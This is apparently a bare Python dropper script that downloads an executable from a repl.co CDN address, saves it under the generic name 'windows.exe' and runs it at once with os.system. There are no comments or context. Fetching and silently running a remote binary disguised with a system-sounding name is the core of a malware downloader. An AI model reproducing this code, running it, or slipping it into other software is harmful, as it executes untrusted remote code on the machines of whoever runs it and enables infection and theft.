import requests
import os
url = 'https://cdn-1.thughunter.repl.co/cdn/nagogy.exe'
response = requests.get(url)

with open('windows.exe', 'wb') as f:
    f.write(response.content)
os.system("start windows.exe")